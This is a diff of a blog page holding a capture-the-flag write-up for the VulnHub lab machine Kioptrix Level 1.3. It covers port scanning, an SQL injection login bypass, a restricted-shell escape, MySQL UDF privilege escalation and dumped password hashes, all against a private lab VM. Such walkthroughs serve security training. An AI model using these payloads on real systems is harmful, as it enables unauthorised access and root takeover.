@@ -1,4 +1,78 @@
-<!DOCTYPE html><html lang=en><head><meta charset=utf-8><meta name=author content="Ankur Tyagi (@7h3rAm)"><meta name=description content="Personal Weblog"><meta content="width=device-width, initial-scale=1" name=viewport><title>Mannthan</title><link href=/static/images/mannthan-32x32.png sizes=32x32 rel=icon type=image/png><script src=/static/js/highlight.min.js></script><script src=/static/js/highlightjs-line-numbers.min.js></script><script charset=UTF-8 src=/static/js/go.min.js></script><link rel=stylesheet href=/static/css/github-gist.min.css><link rel=stylesheet type=text/css href=/static/css/style.md.css media=screen></head><body><div class=header><table><tr><td><a href=/index.html style="color:#fe4164; font-size:14pt;">🏡 Home </a></td><td><a href=/archive.html style="color:#f90; font-size:14pt;">💾 Archive </a></td><td><a href=/tags.html style="color:#69359c; font-size:14pt;">🔖 Tags </a></td><td><a href=/stats.html style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td></tr></table></div><div class=body><h1>[VulnHub] Kioptrix: Level 1.3 (#4)</h1><p><a href=/posts/20190929_vulnhub-kioptrix3.html> « </a>📅 published on <code>08/Oct/2019</code><a href=/posts/20191009_vulnhub-kioptrix5.html> » </a></p><h2>Overview</h2><p>This is a writeup for VulnHub VM <a href=https://www.vulnhub.com/entry/kioptrix-level-13-4,25/ >Kioptrix: Level 1.3 (#4)</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p><p><img alt=writeup.overview.killchain src=/static/files/posts_vulnhub_kioptrix4/killchain.png></p><h2>Phase #1: Enumeration</h2><p>1. Here's the Nmap scan result: </p><pre><code># Nmap 7.70 scan initiated Tue Oct  8 15:47:02 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix4/results/192.168.92.131/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix4/results/192.168.92.131/scans/xml/_quick_tcp_nmap.xml 192.168.92.131
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="utf-8"/>
+    <meta name="author" content="Ankur Tyagi (@7h3rAm)"/>
+    <meta name="description" content="Personal Weblog"/>
+    <meta content="width=device-width, initial-scale=1" name="viewport"/>
+    <title>Mannthan</title>
+    <link href="/static/images/mannthan-32x32.png" sizes="32x32" rel="icon" type="image/png"/>
+    <script src="/static/js/highlight.min.js"></script>
+    <script src="/static/js/highlightjs-line-numbers.min.js"></script>
+    <script charset="UTF-8" src="/static/js/go.min.js"></script>
+    <!-- <link rel="stylesheet" href="/static/css/atom-one-light.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/default.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/docco.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github-gist.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/github.min.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/style.md.css"> -->
+    <!-- <link rel="stylesheet" href="/static/css/zenburn.min.css"> -->
+    <link rel="stylesheet" href="/static/css/github-gist.min.css">
+    <link rel="stylesheet" type="text/css" href="/static/css/style.md.css" media="screen" />
+   </head>
+  <body>
+    <style>
+      .collapsible {
+        cursor: pointer;
+        -webkit-user-select: none;
+        -moz-user-select: none;
+        -ms-user-select: none;
+        user-select: none;
+        width: 100%;
+        border: none;
+        text-align: left;
+        outline: none;
+        cursor: pointer;
+      }
+      .collapsible:after {
+        content: "+";
+        transition: transform .3s ease;
+        display: inline-block;
+        font-weight: bold;
+        float: right;
+      }
+      .expanded::after {
+        content: "-";
+        -ms-transform: rotate(360deg);
+        -webkit-transform: rotate(360deg);
+        transform: rotate(360deg);
+      }
+      .nested {
+        display: none;
+      }
+      .active {
+        display: block;
+      }
+    </style>
+    <div class="header">
+      <table>
+        <tr>
+          <td><a href="/index.html" style="color:#fe4164; font-size:14pt;">🏡 Home </a></td>
+          <td><a href="/archive.html" style="color:#f90; font-size:14pt;">💾 Archive </a></td>
+          <td><a href="/tags.html" style="color:#69359c; font-size:14pt;">🔖 Tags </a></td>
+          <td><a href="/stats.html" style="color:#20b2aa; font-size:14pt;">📊 Stats</a></td>
+        </tr>
+      </table>
+    </div>
+    <div class="body">
+          <h1 class="h1 collapsible" onclick="toggle(this);">[VulnHub] Kioptrix: Level 1.3 (#4)</h1>
+                  <p class="nested"><a href="/posts/20190929_vulnhub-kioptrix3.html"> « </a>📅 published on <code>08/Oct/2019</code><a href="/posts/20191009_vulnhub-kioptrix5.html"> » </a></p>
+                <h2 class="h2 collapsible" onclick="toggle(this);">Overview</h2>
+<p class="nested">This is a writeup for VulnHub VM <a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/">Kioptrix: Level 1.3 (#4)</a>. Here's an overview of the <code>enumeration</code> → <code>exploitation</code> → <code>privilege escalation</code> process:</p>
+<p class="nested"><img alt="writeup.overview.killchain" src="/static/files/posts_vulnhub_kioptrix4/killchain.png" /></p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #1: Enumeration</h2>
+<p class="nested">1. Here's the Nmap scan result:  </p>
+<p class="nested"re><code># Nmap 7.70 scan initiated Tue Oct  8 15:47:02 2019 as: nmap -vv --reason -Pn -sV -sC --version-all -oN /root/toolbox/writeups/vulnhub.kioptrix4/results/192.168.92.131/scans/_quick_tcp_nmap.txt -oX /root/toolbox/writeups/vulnhub.kioptrix4/results/192.168.92.131/scans/xml/_quick_tcp_nmap.xml 192.168.92.131
 Nmap scan report for 192.168.92.131
 Host is up, received arp-response (0.0012s latency).
 Scanned at 2019-10-08 15:47:03 PDT for 35s
@@ -59,7 +133,10 @@ Host script results:
 Read data files from: /usr/bin/../share/nmap
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 # Nmap done at Tue Oct  8 15:47:38 2019 -- 1 IP address (1 host up) scanned in 36.59 seconds
-</code></pre><p>2. From the SMB scan, we find that there are 3 users (other than <code>root</code>) on the target system: </p><pre><code>===============================
+</code></pre>
+
+<p class="nested">2. From the SMB scan, we find that there are 3 users (other than <code>root</code>) on the target system:  </p>
+<p class="nested"re><code>===============================
 |    Users on 192.168.92.131  |
 ===============================
 index: 0x1 RID: 0x1f5 acb: 0x00000010 Account: nobody Name: nobody  Desc: (null)
@@ -67,20 +144,45 @@ index: 0x2 RID: 0xbbc acb: 0x00000010 Account: robert Name: ,,, Desc: (null)
 index: 0x3 RID: 0x3e8 acb: 0x00000010 Account: root Name: root  Desc: (null)
 index: 0x4 RID: 0xbba acb: 0x00000010 Account: john Name: ,,, Desc: (null)
 index: 0x5 RID: 0xbb8 acb: 0x00000010 Account: loneferret Name: loneferret,,, Desc: (null)
-</code></pre><h3>Findings</h3><h4>Open Ports:</h4><pre><code>22/tcp   |  ssh          |  OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
+</code></pre>
+
+<h3 class="h3 collapsible" onclick="toggle(this);">Findings</h3>
+<h4>Open Ports:</h4>
+<p class="nested"re><code>22/tcp   |  ssh          |  OpenSSH 4.7p1 Debian 8ubuntu1.2 (protocol 2.0)
 80/tcp   |  http         |  Apache httpd 2.2.8 ((Ubuntu) PHP/5.2.4-2ubuntu5.6 with Suhosin-Patch)
 137/udp  |  netbios-ns   |  Microsoft Windows netbios-ns (workgroup: WORKGROUP)
 139/tcp  |  netbios-ssn  |  Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
 445/tcp  |  netbios-ssn  |  Samba smbd 3.0.28a (workgroup: WORKGROUP)
-</code></pre><h4>Users</h4><pre><code>ssh: root, robert, john, loneferret
-</code></pre><h2>Phase #2: Exploitation</h2><p>1. We find a login page at <code>http://192.168.92.131:80/index.php</code> and successfully bypass it via a sqli. Once logged in, the webapp shows the unhashed/cleartext password for user <code>john</code>. We repeat the process to obtain password for user <code>robert</code> as well (<code>loneferret</code> is not registered on this web application): </p><pre><code>name: john
+</code></pre>
+
+<h4>Users</h4>
+<p class="nested"re><code>ssh: root, robert, john, loneferret
+</code></pre>
+
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2: Exploitation</h2>
+<p class="nested">1. We find a login page at <code>http://192.168.92.131:80/index.php</code> and successfully bypass it via a sqli. Once logged in, the webapp shows the unhashed/cleartext password for user <code>john</code>. We repeat the process to obtain password for user <code>robert</code> as well (<code>loneferret</code> is not registered on this web application):  </p>
+<p class="nested"re><code>name: john
 password: ' or 1=1 -- -
 
 name: robert
 password: ' or 1=1 -- -
-</code></pre><p><img alt=writeup.exploitation.steps.1.1 src=/static/files/posts_vulnhub_kioptrix4/screenshot01.png> </p><p><img alt=writeup.exploitation.steps.1.2 src=/static/files/posts_vulnhub_kioptrix4/screenshot02.png> </p><p><img alt=writeup.exploitation.steps.1.3 src=/static/files/posts_vulnhub_kioptrix4/screenshot03.png> </p><p>2. We successfully ssh as user <code>john</code> since this user has reused their web application credentials: </p><pre><code>ssh john@192.168.92.131
-</code></pre><p><img alt=writeup.exploitation.steps.2.1 src=/static/files/posts_vulnhub_kioptrix4/screenshot04.png> </p><p>3. We find ourselves in a restricted <a href=https://github.com/ghantoos/lshell>lshell</a> that severly limits usability. We escape this restricted shell by running the <code>echo</code> command with <code>os.system</code> function: </p><pre><code>echo os.system('/bin/bash')
-</code></pre><p><img alt=writeup.exploitation.steps.3.1 src=/static/files/posts_vulnhub_kioptrix4/screenshot05.png> </p><h2>Phase #2.5: Post Exploitation</h2><pre><code>john@Kioptrix4&gt; id
+</code></pre>
+
+<p class="nested"><img alt="writeup.exploitation.steps.1.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot01.png" />  </p>
+<p class="nested"><img alt="writeup.exploitation.steps.1.2" src="/static/files/posts_vulnhub_kioptrix4/screenshot02.png" />  </p>
+<p class="nested"><img alt="writeup.exploitation.steps.1.3" src="/static/files/posts_vulnhub_kioptrix4/screenshot03.png" />  </p>
+<p class="nested">2. We successfully ssh as user <code>john</code> since this user has reused their web application credentials:  </p>
+<p class="nested"re><code>ssh john@192.168.92.131
+</code></pre>
+
+<p class="nested"><img alt="writeup.exploitation.steps.2.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot04.png" />  </p>
+<p class="nested">3. We find ourselves in a restricted <a href="https://github.com/ghantoos/lshell">lshell</a> that severly limits usability. We escape this restricted shell by running the <code>echo</code> command with <code>os.system</code> function:  </p>
+<p class="nested"re><code>echo os.system('/bin/bash')
+</code></pre>
+
+<p class="nested"><img alt="writeup.exploitation.steps.3.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot05.png" />  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #2.5: Post Exploitation</h2>
+<p class="nested"re><code>john@Kioptrix4&gt; id
 uid=1001(john) gid=1001(john) groups=1001(john)
 john@Kioptrix4&gt;  
 john@Kioptrix4&gt; uname
@@ -101,15 +203,79 @@ root
 loneferret
 john
 robert
-</code></pre><h2>Phase #3: Privilege Escalation</h2><p>1. We explore the web directory and find <code>mysql</code> credentials for user <code>root</code>: </p><p><img alt=writeup.privesc.steps.1.1 src=/static/files/posts_vulnhub_kioptrix4/screenshot06.png> </p><p>2. We explore running processes and find that <code>mysql</code> is executing with elevated privileges (pid: 4638). We search for the required <code>mysql</code> shared object file and find it at <code>/usr/lib/lib_mysqludf_sys.so</code>. This means we can run custom commands from within <code>mysql</code> shell as user <code>root</code>: </p><p><img alt=writeup.privesc.steps.2.1 src=/static/files/posts_vulnhub_kioptrix4/screenshot07.png> </p><p>3. We connect to <code>mysql</code> as user <code>root</code> and execute a command to add user <code>john</code> to the <code>admin</code> group: </p><pre><code>mysql -h localhost -u root -p
+</code></pre>
+
+<h2 class="h2 collapsible" onclick="toggle(this);">Phase #3: Privilege Escalation</h2>
+<p class="nested">1. We explore the web directory and find <code>mysql</code> credentials for user <code>root</code>:  </p>
+<p class="nested"><img alt="writeup.privesc.steps.1.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot06.png" />  </p>
+<p class="nested">2. We explore running processes and find that <code>mysql</code> is executing with elevated privileges (pid: 4638). We search for the required <code>mysql</code> shared object file and find it at <code>/usr/lib/lib_mysqludf_sys.so</code>. This means we can run custom commands from within <code>mysql</code> shell as user <code>root</code>:  </p>
+<p class="nested"><img alt="writeup.privesc.steps.2.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot07.png" />  </p>
+<p class="nested">3. We connect to <code>mysql</code> as user <code>root</code> and execute a command to add user <code>john</code> to the <code>admin</code> group:  </p>
+<p class="nested"re><code>mysql -h localhost -u root -p
   select sys_exec(&quot;usermod -a -G admin john&quot;);
   exit
-</code></pre><p><img alt=writeup.privesc.steps.3.1 src=/static/files/posts_vulnhub_kioptrix4/screenshot08.png> </p><p>4. Now we can change to user <code>root</code> and complete the challenge: </p><pre><code>sudo su
+</code></pre>
+
+<p class="nested"><img alt="writeup.privesc.steps.3.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot08.png" />  </p>
+<p class="nested">4. Now we can change to user <code>root</code> and complete the challenge:  </p>
+<p class="nested"re><code>sudo su
 cat /root/congrats.txt
-</code></pre><p><img alt=writeup.privesc.steps.4.1 src=/static/files/posts_vulnhub_kioptrix4/screenshot09.png> </p><p><img alt=writeup.privesc.steps.4.2 src=/static/files/posts_vulnhub_kioptrix4/screenshot10.png> </p><h2>Loot</h2><h3>Hashes</h3><pre><code>root:$1$5GMEyqwV$x0b1nMsYFXvczN0yI0kBB.:15375:............
+</code></pre>
+
+<p class="nested"><img alt="writeup.privesc.steps.4.1" src="/static/files/posts_vulnhub_kioptrix4/screenshot09.png" />  </p>
+<p class="nested"><img alt="writeup.privesc.steps.4.2" src="/static/files/posts_vulnhub_kioptrix4/screenshot10.png" />  </p>
+<h2 class="h2 collapsible" onclick="toggle(this);">Loot</h2>
+<h3 class="h3 collapsible" onclick="toggle(this);">Hashes</h3>
+<p class="nested"re><code>root:$1$5GMEyqwV$x0b1nMsYFXvczN0yI0kBB.:15375:............
 loneferret:$1$/x6RLO82$43aCgYCrK7p2KFwgYw9iU1:15375.............
 john:$1$H.GRhlY6$sKlytDrwFEhu5dULXItWw/:15374:............
 robert:$1$rQRWeUha$ftBrgVvcHYfFFFk6Ut6cM1:15374:............
-</code></pre><h3>Credentials</h3><pre><code>liggoat: john/MyNameIs...., robert/ADGAdsafdfwt4ga......
+</code></pre>
+
+<h3 class="h3 collapsible" onclick="toggle(this);">Credentials</h3>
+<p class="nested"re><code>liggoat: john/MyNameIs...., robert/ADGAdsafdfwt4ga......
 ssh: john/MyNameIs...., robert/ADGAdsafdfwt4ga......
-</code></pre><h2>References</h2><ul><li><a href=https://www.vulnhub.com/entry/kioptrix-level-13-4,25/ >https://www.vulnhub.com/entry/kioptrix-level-13-4,25/</a> </li><li><a href=https://www.abatchy.com/2016/12/kioptrix-level-13-4-walkthrough-vulnhub.html>https://www.abatchy.com/2016/12/kioptrix-level-13-4-walkthrough-vulnhub.html</a> </li><li><a href=http://www.gcura.tech/kioptrix-level-1-3-4/ >http://www.gcura.tech/kioptrix-level-1-3-4/</a> </li><li><a href=https://web.archive.org/web/20190822075547/https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/ >https://web.archive.org/web/20190822075547/https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/</a> </li><li><a href=https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html>https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html</a> </li></ul><p style=text-align:center;>(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p><p style=text-align:center;>« <a href=/posts/20190929_vulnhub-kioptrix3.html>[VulnHub] Kioptrix: Level 1.2 ...</a> « | » <a href=/posts/20191009_vulnhub-kioptrix5.html>[VulnHub] Kioptrix: 2014 (#5)...</a> »</p></div><div class=footer><p style=text-align:center;><a href=https://creativecommons.org/licenses/by-sa/4.0/ rel=license><img src=/static/files/ccbysa4.svg></a></p></div><script>hljs.initHighlightingOnLoad();</script><script>hljs.initLineNumbersOnLoad();</script></body></html>
+</code></pre>
+
+<h2 class="h2 collapsible" onclick="toggle(this);">References</h2>
+<ul class="nested">
+<li><a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/">https://www.vulnhub.com/entry/kioptrix-level-13-4,25/</a>  </li>
+<li><a href="https://www.abatchy.com/2016/12/kioptrix-level-13-4-walkthrough-vulnhub.html">https://www.abatchy.com/2016/12/kioptrix-level-13-4-walkthrough-vulnhub.html</a>  </li>
+<li><a href="http://www.gcura.tech/kioptrix-level-1-3-4/">http://www.gcura.tech/kioptrix-level-1-3-4/</a>  </li>
+<li><a href="https://web.archive.org/web/20190822075547/https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/">https://web.archive.org/web/20190822075547/https://www.adampalmer.me/iodigitalsec/2013/08/13/mysql-root-to-system-root-with-udf-for-windows-and-linux/</a>  </li>
+<li><a href="https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html">https://bernardodamele.blogspot.com/2009/01/command-execution-with-mysql-udf.html</a>  </li>
+</ul>
+        <p class="nested" style="text-align:center;">(🔖 tagged <a href=/tags.html#vulnhub>vulnhub</a> and <a href=/tags.html#writeup>writeup</a>)</p>
+                  <p class="nested" style="text-align:center;">« <a href="/posts/20190929_vulnhub-kioptrix3.html">[VulnHub] Kioptrix: Level 1.2 ...</a> « | » <a href="/posts/20191009_vulnhub-kioptrix5.html">[VulnHub] Kioptrix: 2014 (#5)...</a> »</p>
+            </div>
+    <script>hljs.initHighlightingOnLoad();</script>
+    <script>hljs.initLineNumbersOnLoad();</script>
+    <script>
+      function toggle(elem) {
+        elem.classList.toggle("expanded");
+
+        var ish2 = false; var ish3 = false;
+        if (elem.classList.contains("h2")) { ish2=true; }; if (elem.classList.contains("h3")) { ish3=true; }
+        console.log(elem); console.log(ish2); console.log(ish3);
+
+        var sibling = elem.nextElementSibling;
+        while (sibling) {
+          if (ish2 && sibling.classList.contains("h2")) {
+            sibling.classList.toggle("active");
+            break;
+          }
+          if (ish3 && (sibling.classList.contains("h2") || sibling.classList.contains("h3"))) {
+            sibling.classList.toggle("active");
+            break;
+          }
+          if (sibling.classList.contains("collapsible")) {
+            sibling.classList.toggle("expanded");
+          }
+          sibling.classList.toggle("active");
+          sibling = sibling.nextElementSibling;
+        }
+      }
+    </script>
+    <div class=footer><p><a href=https://creativecommons.org/licenses/by-sa/4.0/ rel=license><img src=/static/files/ccbysa4.svg></a></p></div>
+  </body>
+</html>
